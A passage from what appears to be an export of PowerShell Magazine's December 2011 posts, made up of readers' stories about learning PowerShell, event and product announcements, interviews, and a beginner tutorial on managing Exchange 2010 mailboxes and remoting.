brethren to join us, if for no other reason than to keep us honest about what the job of an administrator truly is and how PowerShell fits into the picture (OK, maybe I just went too far). 😉\nIf you’re an Admin reading this, understand that the community of early-adopters is brilliant, caring, and always willing to help. Understand that you do not need to learn to be a developer and much of what you see on the web is the passion that we have over an extremely flexible and powerful tool. If you’re just getting started, ignore all the ‘code’ and focus on these things:\n Use PowerShell anytime you would usually use a command prompt. Use it for ping, ipconfig, dir, launching Notepad, whatever the case might be. By doing this, you will find that PowerShell is not a programming language, but an interactive tool. Learn to read and use the help system. Help, Get-Help, Man, they all do the same thing, they get you help. PowerShell has the most extensive and useful help system of any command line. Good people worked very hard on this. It will solve your problem, but you have got to learn how to understand what it provides. Always, always use the –Full option. If you see something you don’t understand in the help system, don’t wait. Find out what it means. Learn how the pipeline works. I mean really learn how it works and how cmdlets pass information down the pipeline. You must be a master at understanding how cmdlets hook-up. This will allow you to discover how a cmdlet works (even ones you have never used before) and to make one-liners to solve problems.  If you begin your PowerShell journey by only focus on these three things, then you will quickly be using PowerShell for real solutions in your job. You can add the programmatic ‘code’ stuff such as automation and toolmaking later as it’s needed.\nWhere do you learn this? I will recommend to you the same thing I recommend to my closest friends just starting out with PowerShell. I will offer two options based on how you like to learn things.\n A book called ‘Learn Windows PowerShell in a Month of Lunches’ by Don Jones. Don’t get any other books yet until you accomplish the above three goals. This book will achieve those. Here’s a hint on how to use his book. Do exactly what he says to ‘do’. Don’t just read it, have a PowerShell prompt open and do exactly what he says. Take a class that focuses on the above tasks, not on scripting. I’m pretty sure I know of one or two classes that will work. 😉  Before I return to my grammar lessons, a last note to Admins beginning with PowerShell —you can be successful with PowerShell. You have a community of the brightest and best people I have ever met. Join the community and ask questions.\nKnowledge is PowerShell,\nJason\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/26/helping-admins-getting-started-with-powershell/","tags":["Learning PowerShell"],"title":"Helping Admins Getting Started with PowerShell"},{"categories":["Learning PowerShell"],"contents":"When I first discovered the existence of PowerShell it was in its pre-release stages and still known as Monad. At first I couldn’t believe what I was seeing and hearing, “A Windows shell that uses objects? Awesome! Look at all the cool stuff they’re doing with it!” I exclaimed to no one in particular. Having only used cmd.exe and DOS shells of old, and with some small amount of experience with VBScript and C/C++, the thought of having an object-oriented interactive shell was very exciting. I quickly downloaded the Monad beta and got it installed. Within a few moments I was greeted with the classic PowerShell prompt:\nPS C:\\\u0026gt;\nThen I realized–I had no idea what to do next. Installing PowerShell was easy; figuring out how to use it to do what I wanted would prove significantly more difficult. Eventually I learned the first of what I think of as the three “pillar cmdlets” of PowerShell: Get-Help. Not long after that I learned of the second: Get-Command, and later the third: Get-Member. To me, and in my experience to most of the people I have shared PowerShell with, the most difficult part of learning to use and love PowerShell is learning how to use PowerShell to explore itself. It’s a bit like having to pick yourself up by your own bootstraps.\nAt the beginning of my learning curve I would force myself, time permitting, to figure out how to accomplish a task using PowerShell. Often this meant typing “Get-Command” at the prompt and looking for a cmdlet that seemed promising. This was a challenge of will because usually I could accomplish the same task in a few minutes using methods I was accustomed to. There was much trial and error on my part at that time; proper documentation and community knowledge were still in their infancies. Once PowerShell in Action was published, I read it cover to cover even though there were whole chapters I wouldn’t understand until much later. I’m looking at you extensible type system.\nWhy go to all this trouble to learn some new technology? Having the interactive shell made solving a challenge in a repeatable manner much simpler. I could rapidly discover syntax problems at the command prompt instead of having WScript blow up in my face because I can never get LDAP filter syntax right the first time. I suppose I invested all the time I did in learning PowerShell because I believed that, as far as Windows went, it was better and easier to automate tasks with than anything else I had access to. Now that a PowerShell scripting interface has been mandated by the common engineering criteria at Microsoft, I’m very glad that I chose to invest time in learning it.\nToday there is a vast community that has grown up around PowerShell that is, in my experience, happy to welcome and help the newcomer. I believe it is the best resource any newcomer has at their disposal. Nowhere have I experienced that help more than in the official PowerShell forums. I’m certainly grateful to have had so many people willing to lend a hand to me as I learned, and today I try to give back to other newcomers through the forums, blogging, and training workmates. For any newcomer today I have only a few bits of advice: Remember Get-Help, Get-Command, and Get-Member. Ask questions of the community. Do your best to give back when possible. Enjoy the journey! I don’t believe a Windows admin could better invest time in learning a different technology.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the How I Learned to Stop Worrying and Love Windows PowerShell contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/23/how-i-learned-to-love-the-powershell/","tags":["Learning PowerShell"],"title":"How I learned to Love the PowerShell"},{"categories":["News","Workflows"],"contents":"Windows PowerShell workflows consist of a set of activities that run in sequence or in parallel and perform long-running, complex management tasks, such as multimachine application provisioning. Using the Windows Workflow Foundation at the command line, Windows PowerShell workflows are repeatable, parallelizable, interruptible, and recoverable.\nThe PowerShell team has published the “Getting Started with Windows PowerShell Workflow” document on the CTP2 download page (look for “WMF3 CTP2 Windows PowerShell Workflow.pdf”). This document will get you started with this newest addition to PowerShell functionality (you can also find a link to the CTP2 page in the Downloads sidebar widget on our homepage).\nKeep in mind that CTP2 is a pre-release version. Features and behavior are likely to change before the final release, so if you have any feedback please provide it via PowerShell Connect. ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/23/getting-started-with-windows-powershell-workflows/","tags":["News","Workflows"],"title":"Getting Started with Windows PowerShell Workflows"},{"categories":["Interviews"],"contents":"Courtesy of TrainSignal (a hat tip to Kasia Lorenc) we are presenting an interview with Thomas Lee conducted at TechEd NA 2011 in Atlanta.\nPart 1   Part 2   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/22/an-interview-with-powershell-mvp-thomas-lee-at-teched-na-2011/","tags":["Interviews"],"title":"An interview with PowerShell MVP Thomas Lee at TechEd NA 2011"},{"categories":["Learning PowerShell"],"contents":"Being a student of IT is not simple. In my first steps in the career I could not realize how big and varied are the products of Microsoft, to the point where you have to choose a way forward (a path to follow). In fact, my entire career was focused on Computer Science, the general stuff, but I never thought I would enjoy working with servers so much.\nMy journey with Microsoft servers started 2 years ago when I was selected to attend a course on Windows Server 2008 Active Directory. In order for my career focus to become a reality, I needed to demonstrate with diplomas and qualifications that I was able to take that course. At the end I just came up with the idea “I want to be a systems administrator”, and why not an “infrastructure engineer”. Since then, I centralized my efforts on learning; buying trainings, many books, audios, going to any conference I can, working with real network administrators, receiving all kind of experiences and, without notice I found myself with a solid knowledge on network fundamentals. I was ready to begin an infrastructure path.\nWhen learning Windows Server 2008, a “more than a tool” came out called PowerShell. For many people I’ve known, this was nothing but another console for scripting and they made it looked like this was for those Linux administrators who changed their flag to Windows server scripting. Nevertheless, I was intrigued by this new automation scripting tool. Unfortunately, I was not able to “get hands-on” with PowerShell until version 2.0 was out as part of Windows Server 2008 R2 operating system, and Server Core, which now had the ability to be an Application Server with PowerShell 2.0 available on it.\nWhere to begin? That was the question. I’m a big fan of IT books, so I had the opportunity to get a nice copy of the Windows PowerShell 2.0 book written by Don Jones and Jeffery Hicks. That book was not meant for beginners so I bought another one written specifically for new users- Learn Windows PowerShell in a Month of Lunches. I haven’t finished it yet but hopefully, at the end, I’ll be able to use the other one. So, the thing about PowerShell is this amazing scripting language that can really make your life easier but, learning PowerShell is a long ride (or long way), you might spend hours and hours training what PowerShell has for you to offer.\nPowerShell is definitely becoming more and more popular these days. Actually, now is the right time to pay attention and focus on learning PowerShell if you want to be a productive and efficient administrator. For example, there are many ways to create users in Active Directory using a script, CSVDE, LDIFDE, or manually… Well, with PowerShell you can create hundreds and thousands of users at once, so, as an administrator, you should really check it out.\nWhat’s next for me? As an IT administrator, it is keeping up to date anytime anywhere, so that means that PowerShell is next for me. There are many books and trainings out there so I’ll be preparing myself and spending less hours on the server because of manual configurations; The International Book Fair came two weeks ago. For many IT administrators this is a great opportunity to buy books, nonetheless I was surprised of the lack of technologies buyers; I even bought a Windows Server 2008 Administrator’s Guide book. I believe, the majority of IT people here don’t think they should keep studying, and like I say, “Today better than yesterday and tomorrow better than today”, I invite you to begin studying PowerShell; you will love its potential.\nThank you for reading.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the How I Learned to Stop Worrying and Love Windows PowerShell contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/21/knowledge-get-powershell/","tags":["Learning PowerShell"],"title":"$Knowledge = Get-PowerShell"},{"categories":["News"],"contents":"/n software, the makers of NetCmdlets, is offering a FREE NetCmdlets Workstation License_._ NetCmdlets extend the features of Microsoft Windows PowerShell with a broad range of network management and messaging capabilities. The current release contains dozens of cmdlets providing access to network and host protocols such as SNMP, LDAP, DNS, Syslog, HTTP, WebDav, FTP, SMTP, POP, IMAP, Rexec/RShell, Telnet, and more.\nHurry, this offer ends on Christmas day – Get your free license now!\nHappy Holidays!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/21/free-netcmdlets-workstation-license/","tags":["News"],"title":"FREE NetCmdlets Workstation License"},{"categories":["Exchange"],"contents":"Ask an experienced Exchange administrator and they’ll tell you that learning PowerShell is important to be able to do the job well. Even though most administrative tasks can be performed using the Exchange Management Console it tends to be much slower to navigate, and is less efficient for doing bulk administration. If you’re still holding yourself back from learning PowerShell, then here are five tips to help get you started.\nDiscovering Commands One of the first challenges with using PowerShell for Exchange Server management is knowing which commands to run for the task you want to perform. Fortunately you only need to remember one: Get-Command.\nUsing Get-Command you can quickly search for cmdlets based on keywords. Let’s say for example you want to administer a mailbox. Using Get-Command you can discover all of the cmdlets that have the noun “mailbox” in them.\nPS\u0026gt; Get-Command -Noun Mailbox CommandType Name ----------- ---- Cmdlet Connect-Mailbox Cmdlet Disable-Mailbox Cmdlet Enable-Mailbox Cmdlet Get-Mailbox Cmdlet New-Mailbox Cmdlet Remove-Mailbox Cmdlet Restore-Mailbox Cmdlet Search-Mailbox Cmdlet Set-Mailbox With PowerShell’s simple “Verb-Noun” cmdlet names you can now quickly see which cmdlet to use if you want to get a list of mailboxes, set a mailbox property, or create a new mailbox.\nFiltering Output Some PowerShell cmdlets return a lot of data. For example if you run Get-Mailbox it will return every mailbox in your organization. That may be hundreds or thousands of mailboxes, when all you really wanted is the mailboxes that match a certain criteria. PowerShell lets you filter the data that a cmdlet returns by using the Where-Object command, or simply “where” as it is often abbreviated. For example, to get the list of mailbox users in the branch office of the organization you can run the following command:\nPS\u0026gt; Get-Mailbox | Where-Object { $_.Office -eq \u0026#34;Branch Office\u0026#34;} Name Alias ServerName ProhibitSendQuota ---- ----- ---------- ----------------- Alex.Heyne Alex.Heyne br-ex2010-mb unlimited John.Williams John.Williams br-ex2010-mb unlimited Judith.Rodrigues Judith.Rodrigues br-ex2010-mb unlimited Katherine.Phipps Katherine.Phipps br-ex2010-mb unlimited Olive.Weeks Olive.Weeks br-ex2010-mb unlimited Sonia.Smith Sonia.Smith br-ex2010-mb unlimited Wendy.Fyson Wendy.Fyson br-ex2010-mb unlimited As you can see by filtering the output of Get-Mailbox to only those where the “Office” attribute equals “Branch Office”, you can retrieve only the data that you are interested in seeing.\nUsing the Pipeline One of the PowerShell techniques you will use regularly is the pipeline. In PowerShell the pipeline is how output from one command is passed to another. You may have noticed in the previous example the | (or pipe) character that was between the Get-Mailbox and Where-Object cmdlets. That is an example of the pipeline in action. Continuing the previous example, let’s say that the business has decided that all branch office mailbox users should have a 3Gb mailbox storage quota. You can use the same command shown above to get the branch office mailboxes, and then pipe that into the Set-Mailbox cmdlet to make the change to their storage quota settings.\nGet-Mailbox | Where-Object { $_.Office -eq \u0026#34;Branch Office\u0026#34;} | Set-Mailbox -IssueWarningQuota 2.8Gb -ProhibitSendQuota 3Gb Now when we look at the list of branch office mailboxes again we can see the change to the storage quota settings.\nName Alias ServerName ProhibitSendQuota ---- ----- ---------- ----------------- Alex.Heyne Alex.Heyne br-ex2010-mb 3 GB (3,221,225,472 bytes) John.Williams John.Williams br-ex2010-mb 3 GB (3,221,225,472 bytes) Judith.Rodrigues Judith.Rodrigues br-ex2010-mb 3 GB (3,221,225,472 bytes) Katherine.Phipps Katherine.Phipps br-ex2010-mb 3 GB (3,221,225,472 bytes) Olive.Weeks Olive.Weeks br-ex2010-mb 3 GB (3,221,225,472 bytes) Sonia.Smith Sonia.Smith br-ex2010-mb 3 GB (3,221,225,472 bytes) Wendy.Fyson Wendy.Fyson br-ex2010-mb 3 GB (3,221,225,472 bytes) Discovering Object Properties PowerShell is an object-oriented language. If you don’t know what that means then don’t worry, I was using PowerShell for almost two years before I began to understand what it meant.\nAn “object” is simply a collection of data. In Exchange Server 2010 an object could be a mailbox, a distribution group, a database, or one of many other things.\nAn object has properties. In the example of a mailbox object these include properties such as the name of the database the mailbox resides on, the mailbox storage quota values, or the office location for the mailbox user. In the previous examples we looked at filtering mailboxes using the “Office” attribute, and setting the values for mailbox storage quota attributes. But how do we know which properties a mailbox object has, so that we can perform that filtering or apply changes to those settings?\nAgain PowerShell gives us the answer thanks to the Get-Member cmdlet. Get-Member will list all of the properties of an object to help you learn what you can and can’t do with them. For example, to discover which properties the mailbox object has you can run the following command (note once again the use of the pipeline):\nPS\u0026gt; Get-Mailbox | Get-Member TypeName: Microsoft.Exchange.Data.Directory.Management.Mailbox Name MemberType ---- ---------- Clone Method Equals Method GetHashCode Method GetProperties Method GetType Method ToString Method Validate Method AcceptMessagesOnlyFrom Property AcceptMessagesOnlyFromDLMembers Property AcceptMessagesOnlyFromSendersOrMembers Property AddressBookPolicy Property AddressListMembership Property Alias Property AntispamBypassEnabled Property ArbitrationMailbox Property ArchiveDatabase Property ArchiveDomain Property ArchiveGuid Property ArchiveName Property ArchiveQuota Property ArchiveStatus Property ArchiveWarningQuota Property AuditAdmin Property AuditDelegate Property AuditEnabled Property AuditLogAgeLimit Property AuditOwner Property I’ve had to truncate the output in this example because it returns quite a long list of properties that mailbox objects have. It would be more convenient to filter the list down to just the properties I might be interested in. So let’s say that we just want to see which mailbox object properties relate to quota settings. Once again we can use the pipeline and filtering to achieve that.\nPS\u0026gt; Get-Mailbox | Get-Member -Name \u0026#34;*quota*\u0026#34; TypeName: Microsoft.Exchange.Data.Directory.Management.Mailbox Name MemberType ---- ---------- ArchiveQuota Property ArchiveWarningQuota Property IssueWarningQuota Property ProhibitSendQuota Property ProhibitSendReceiveQuota Property RecoverableItemsQuota Property RecoverableItemsWarningQuota Property RulesQuota Property UseDatabaseQuotaDefaults Property Pretty neat isn’t it.\nRemoting The last essential skill that I’ll demonstrate to you in this article is remoting, which is a feature available in PowerShell 2.0 and above. Exchange Server 2010 servers require at least PowerShell 2.0, so this technique will work for Exchange 2010 environments. Remoting is simply the technique of connecting a PowerShell session on the local computer to a remote server. This is useful if you are logged on to a workstation that has PowerShell installed, but doesn’t have the Exchange Server 2010 management tools installed, and you need to run some Exchange management tasks. By remoting from the workstation to an Exchange 2010 server you quickly get access to all of the Exchange cmdlets.\nTo demonstrate, here is a PowerShell window on a workstation that does not have the Exchange 2010 management tools installed. Notice that the Get-ExchangeServer cmdlet returns an error because it doesn’t exist on that workstation.\nPS\u0026gt; Get-ExchangeServer The term \u0026#39;Get-ExchangeServer\u0026#39; is not recognized as the name of a cmdlet, functi on, script file, or operable program. Check the spelling of the name, or if a p ath was included, verify that the path is correct and try again. At line:1 char:19 + Get-ExchangeServer \u0026gt;\u0026gt;\u0026gt;\u0026gt; + CategoryInfo : ObjectNotFound: (Get-ExchangeServer:String) [], CommandNotFoundException + FullyQualifiedErrorId : CommandNotFoundException Now let\u0026rsquo;s remote to an Exchange 2010 server and try running the cmdlet again. There are two steps for PowerShell remoting. The first is to create a new PowerShell session object using New-PSSession.\n$session = New-PSSession -ConfigurationName Microsoft.Exchange ` -ConnectionUri http://ho-ex2010-mb1.exchangeserverpro.net/powershell ` -Authentication Kerberos Notice the URI that the session is connecting to? That is the /powershell virtual directory in IIS on the Exchange 2010 server named “ho-ex2010-mb1”. After you have created the new session object you can import it using Import-PSSession.\nPS\u0026gt; Import-PSSession $session ModuleType Name ExportedCommands ---------- ---- ---------------- Script tmp_c536eb19-09db-41c1... Get-ExchangeDiagnosticInfo Now let’s try the Get-ExchangeServer cmdlet again.\nPS\u0026gt; Get-ExchangeServer Name Site ServerRole Edition AdminDisplayVe rsion ---- ---- ---------- ------- -------------- BR-EX2010-MB exchangeserverpro... Mailbox,... Enterprise Version 14.... HO-EX2010-CAHT1 exchangeserverpro... ClientAc... Enterprise Version 14.... HO-EX2010-MB1 exchangeserverpro... Mailbox,... Enterprise Version 14.... HO-EX2010-MB2 exchangeserverpro... Mailbox,... Enterprise Version 14.... HO-EX2010-EDGE exchangeserverpro... Edge Standard... Version 14.... This time it works, thanks to PowerShell remoting.\nAs you can see from this article PowerShell is not a daunting language to learn and to begin using on a daily basis once you understand a few of the fundamental skills involved. Try some of these yourself and let us know in the comments below if you have any questions.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/20/5-essential-powershell-skills-for-exchange-server-administrators/","tags":["Exchange"],"title":"5 Essential PowerShell Skills for Exchange Server Administrators"},{"categories":["Learning PowerShell"],"contents":"When I was hired into my current position in July 2007, one of my first tasks was to modify an Active Directory attribute for SharePoint contacts. Specifically, we needed to set the attribute “mapiRecipient” to False. The process that created the contacts left the Boolean attribute in a “Not set” state – that is, neither True nor False.\nMy supervisor said I could use either VBScript or PowerShell to do this.\nAs we were planning our transition from Exchange 2000 to Exchange 2007, I decided to use PowerShell.\nI had come from a background of writing .Net programs in C# and VB.Net so I was not unfamiliar with the underlying structure of PowerShell objects. I was able to fairly quickly create a script to modify the one custom attribute, which is still in use today – albeit in a slightly modified form.\nHaving a background in .Net can be both a blessing and a curse, depending on how you look at it. I tend to write scripts with a C# style instead of a “PowerShelly” style.\nI quickly realized that there was way more to this PowerShell stuff than the simple scripts I was creating, and started reading blogs by Shay Levy, Brandon Shell, Marco Shaw, Lee Holmes, Marc van Orsouw, as well as the official Microsoft PowerShell blog, and hanging out in the now defunct Microsoft newsgroups (replaced by the Windows PowerShell forum on TechNet). Pretty soon I started thinking I could actually offer help to people as a way of paying back the community for all the help I’d been provided. Marco in particular started noticing and suggested I create my own blog. Then, less than a year later, Marco asked me if I wanted to work on a book. It took a little over a year, but the “Windows PowerShell 2.0 Bible” was published in September.\nI’m still nowhere near as competent with PowerShell as the people who have unknowingly mentored me, but I have high hopes.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/19/get-powershell-create-blog-write-book/","tags":["Learning PowerShell"],"title":"Get-PowerShell | Create-Blog | Write-Book"},{"categories":["Learning PowerShell"],"contents":"I have been employed as a Windows systems administrator for the last 14 years, cutting my enterprise teeth back in the NT days. I’ve worked for governments, dot coms, and non-tech oriented corporations. I’ve always been “The Windows Guy”. I started off supporting a handful (and ever increasing number) of Windows servers in a Novell environment. Later I found myself “The Windows Guy” again in a mostly Linux dot com shop. Currently I am with a large financial company that is mostly Windows but still Java at heart, so my .NET corner is once again the minority.\nI do not recall my first script in PowerShell. It probably was not some miraculous piece of automation, saved my employer millions, or won any business deals. If I was able to find it in a backup I would probably be horrified, disavowing knowledge of it. I am sure I eagerly emblazoned my name and email in the top comments, ‘sigh’. Being a heavy user of VBscript, before PowerShell, at some point I realized I was authoring scripts that were effectively “VBScript” in PowerShell. I eventually used VBScript less and less, and through many wonderful and insightful posts from the PowerShell blogosphere I transitioned and really began to use and understand PowerShell for PowerShell.\nI think sometimes we can look at PowerShell and our corners of the Microsoft world and say “I don’t really have anything that I can use with PowerShell”. You may not run this or that piece of the Microsoft stack, or even the latest and greatest. Many of us are just beginning to use v2 completely in our enterprises with transitions to Server 2008 R2 and Windows 7. There will be a tremendous amount of awesomeness in PowerShell v3 and Windows 8; however many of us will continue to use PowerShell v2 for a long time. Never get fooled into thinking you have to have “a better environment” to get the most out of PowerShell. Or limit yourself because there is no PowerShell module or cmdlets for what you administer in your enterprise, be it legacy Windows, custom applications and services, or entirely non-Windows systems.\nHere are some tips from my endeavors over the years. Unfortunately they are not fully detailed but enough for you and your favorite search engine to build on.\n– Quit using cmd.exe. Running net, ipconfig, netsh, ping, or netstat works just fine in PowerShell, as do most other “native” commands. Perform the exercise of finding the PowerShell way of accomplishing the same task, i.e. Get-Service. If there is no single cmdlet that mirrors the command write a function that gets you there.\n– The type accelerator is very handy. For example:\n$content = Get-Content -Path SomeFile.xml This is a first class object. Many configuration files, even non Microsoft, are XML based.\n– PowerShell’s .NET integration, a more advanced path, has capabilities that can be harnessed today. The MSDN .NET documentation is great and many entries have PowerShell examples in the comments. Classes like System.Net.WebClient and System.Net.Sockets can be used against web services and Linux daemons.\n– For those of us with legacy systems and applications, the COM object can still be used under PowerShell. Check the help for New-Object, load up an instance, and dig in with Get-Member. You will be amazed at what is possible.\n– Regardless of these or other methods used to solve problems, always output objects. If you live by this rule your future self with thank you.\n– Find and attend a PowerShell user group, they are popping up everywhere. I attend AZPosh which also provides a live interactive broadcast of meetings. This is great if there are no groups in your area.\nAt the end of the day the best PowerShell scripts you author will be the ones that solve your unique problems. Whether that is simplifying your daily administration or satisfying your enterprises business need.\nJoel Reed.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/16/powershell-limit-none/","tags":["Learning PowerShell"],"title":"PowerShell -Limit none"},{"categories":["Interviews"],"contents":"Courtesy of TrainSignal (a hat tip to Kasia Lorenc) we are presenting an interview with Don Jones conducted at TechEd NA 2011 in Atlanta. The video is a little warm up before today’s PowerScripting Podcast.\nDon Jones is a popular IT author, speaker, trainer, and recipient of Microsoft MVP award. Don has been an expert in Windows PowerShell for many years. He developed the Microsoft PowerShell courseware and has taught PowerShell to more than 20,000 IT pros. Don has recently started hosting Ask Don Jones forum at PowerShell.com and new Don Jones\u0026rsquo;s PowerShell Tips blog. His new Windows PowerShell v2 Booster and v3 Sneak Peek with Don Jones Interface Technical Training’s course is available to online attendees as well.\nIn this video interview Don talks about why IT professionals should learn PowerShell, how we should define a private cloud, his new book Learn Windows PowerShell in a Month of Lunches, and how his company, Concentrated Technology, can help your business.\nTo quote PowerScripting Podcast’s hosts: “If you’ve heard Don speak, you already know that you don’t want to miss it. If you haven’t heard Don speak, let me assure you, you don’t want to miss it.\n   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/15/an-interview-with-powershell-mvp-don-jones-at-teched-na-2011/","tags":["Interviews"],"title":"An interview with PowerShell MVP Don Jones at TechEd NA 2011"},{"categories":["Learning PowerShell"],"contents":"Hello. My name is Jonathan Tyler…and I am a PowerShell junkie.\nI work for one of the world’s leading providers of commercial transportation solutions. In my current role, I support a SharePoint farm for the Internet, Extranet, and Intranet solutions in the company. I have worked for this company for five years and it has been a great place to learn and grow in PowerShell practices.\nWhen I first joined the company, I was a Windows Server administrator also responsible for Citrix servers. I started by automating a lot of tasks that were given to me through VBScript. I had not yet really learned much about PowerShell, except that it was on the way. Once released, I began to try to move my scripting over to PowerShell. It didn’t take like I had hoped. I spent many hours banging my head against the wall trying to figure out how to get things to work, so I gave up. I should have kept going.\nMore and more, I was doing repetitive tasks that I knew could be done easier…I had heard that it could and seen some examples, but I had not tried to make it work for me. So, in May, 2008, I went to TechEd where I sat in a PowerShell session with none other than the Scripting Guys, in person. After running through some of their tutorials and armed with the handouts from that session (all of which I still have) I renewed my resolve to learn PowerShell. When I got back to work, I began trying to use PowerShell for daily routines that I had been given. Not all of them worked as I had hoped, but it was a start, and I was getting a foothold into this technology. I forced myself to at least try to make a PowerShell command work for what I needed. I really believe that is the key. You have to put yourself in a position to use it or else you will make an excuse for why you don’t need to. The more I tried to use PowerShell, the more comfortable it became and the turnaround on getting something done in PowerShell became shorter.\nFast-forward a few years, and I am now supporting these SharePoint farms/applications. The strong basis that I built in the server administration realm has become the bedrock for some of my latest projects. Using PowerShell has helped me to quickly slice through gigabytes of log files much faster than it ever took me to try to search by hand. That efficiency has helped to identify problems more quickly and prove where the problems are.\nSome of my latest projects have revolved around creating modules that can be used by my team for deploying solutions to our many web applications to streamline and formalize our processes. With the new push to use PowerShell, some of my colleagues are also beginning to see the value and are moving away from C# tools for site maintenance to using PowerShell scripts.\nAs I get time and learn something new, I still like to write articles for my blog at http://powershellreflections.wordpress.com and also to try to help people on various forums or over Twitter.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/14/how-powershell-made-my-life-easier/","tags":["Learning PowerShell"],"title":"How Powershell Made My Life Easier"},{"categories":["Learning PowerShell"],"contents":"I will start by saying that a person’s overall experience is no indication of his/her knowledge. I have over 10 years of experience and I spent the first five years supporting desktop systems and applications. Then, I changed my job and went to a company which had lots of enterprise clients and this was in the year of 2005 when VB Scripting was very famous among system administrators. I was told by my seniors that scripting was too complex and difficult to learn. I tried learning VB Script and gave up very soon. My journey of learning and using scripting ended even before starting.\nAfter this, things have changed quite a bit for me. I joined my current company and went to UK for an internal training on IT systems. I met several bright people there who inspired me to get started again in scripting. Especially Ben – our IT Manager – was a great scripter himself. He said, “Aman, PowerShell is very easy and it’s very easy to learn” – maybe he was just comforting me, I thought. He gifted me a book on PowerShell – Windows PowerShell 2.0 for dummies.\nOnce I came to speed, I quickly started using PowerShell for basis activities including:\n Using PowerShell as a calculator System ping, reboot, and shutdown Working with files and folders Open applications, etc  As Ben said, PowerShell is straight forward and simple to learn. All I needed was some focus and enthusiasm to learn. My first script was, starting a stopped service but with some simple logic.\n$a = Get-Service WinRM if($a.Status -eq \u0026#34;Stopped\u0026#34;) { $a.Start() } elseIf($a.Status -eq \u0026#34;Running\u0026#34;) { echo $a.Name \u0026#34;is running\u0026#34; } PowerShell scripting seemed easy to me and I finally wrote a 100-line script and posted it on PowerShell.com. There were 73 downloads and I even got an email from a user of this script and he said that he liked it and thanked me for the script. This was the first kick! I told to myself, yes, I am scripter! And, I was very happy.\nThe “PowerShell community”, are a group of great IT guys and very nice people! Everyone I met or interacted with – Ed Wilson, Shay Levy, and many more – inspired me a lot. Ed helped me create the New Delhi PowerShell User Group and Shay helps almost every day and answered all my questions!\nIf I have to describe the PowerShell community in a single phrase, I’d say “they are the best”!\nI am currently writing two blogs, one is dedicated to the New Delhi PowerShell User Group and another one is on SCOM.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/12/powershell-and-i/","tags":["Learning PowerShell"],"title":"PowerShell and I"},{"categories":["News"],"contents":"The 13th Edition of Microsoft Virtual TechDays is scheduled between 14-16 December, 2011. Virtual TechDays is an event for all types of audience — developers, IT professionals, and architects. This is a free to attend and online event.\nIn this edition of VTD, there are over 14 technology tracks and several speakers ranging from Microsoft evangelists to MVPs to community/industry leaders.\nWindows PowerShell @ Virtual TechDays There are a couple of Windows PowerShell sessions in this edition of VTD.\nWindows PowerShell 3.0 - A first Look By Ravikanth Chaganti\nTiming:15th, December 2011, 4:15pm-5:15pm (IST)\nWindows PowerShell 3.0 builds on a great set of features of version 2.0 and enables IT administrators to achieve more. Windows PowerShell 3.0 includes various new features such as Workflows, robust remoting sessions, scheduled jobs, improved ISE, and several other language improvements. In this session, we will look at a subset of Windows 3.0 features and understand how these new features can help IT administrators achieve more.\nWindows Server 2008 R2: Server Management and PowerShell V2 (Hands-on Lab) By Manoj Ravikumar Nair\nTiming: 16th, December 2011, 3:00pm-4:00pm (IST)\nAfter completing this lab, you will be better able to use Server Manager to remotely manage a computer, you’ll be more familiar with Windows PowerShell V2 Integrated Scripting Environment, you’ll be better able to work with Windows PowerShell background jobs, remote computers using Windows PowerShell, Windows PowerShell, and PowerShell to manage Server Core.\nRegistration Virtual TechDays is a free to attend event and you can register for the same at http://www.virtualtechdays.com/registration1.aspx. All sessions are broadcasted live and you can watch all of them sitting right in-front of your computer.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/10/windows-powershell-at-microsoft-virtual-techdays-online-event/","tags":["News"],"title":"Windows PowerShell at Microsoft Virtual TechDays (Online event)"},{"categories":["Learning PowerShell"],"contents":"It was the time when I started working on a project which involved data entry form to register new employees and the information about their allocated PC details. We had a requirement of getting information on their department or sub-department or business unit from another SharePoint application’s list which had all this information. The “other” application was like an in-house address book. I did all kinds of research and finally stumbled upon this word called PowerShell.\nI had worked in C-shell scripting before and loved it madly. I had an idea that PowerShell should be the same as c-shell with more power 🙂\nI used my Googling skills and searched all over about PowerShell. In the beginning, I felt PowerShell was just an extended version to STSADM commands and can be used only by administrators. But, I was wrong. When I found the wonders we can do with it, I was just pleasantly surprised. I planned to spend all my research time on PowerShell.\nComing back to my project, I was looking for a script to copy contents from Site A’s list to Site B’s List and wanted it to copy only the updated items. I got some help from the web and but, when I wanted to modify the script to my needs, I found it really difficult to do that. I had to read the script thoroughly to understand each and every line and every word in it. I did not want to give up and spent more time learning PowerShell. I slowly fell in love with PowerShell. Every time, I mention PowerShell in a meeting, people want me to talk more about it. They are curious to know what all we can achieve.\nA few months ago, I had the chance of viewing an online SharePoint Saturday event and there was a session on PowerShell by Ravikanth Chaganti. My interest in PowerShell grew and finally brought me to a point where I can never 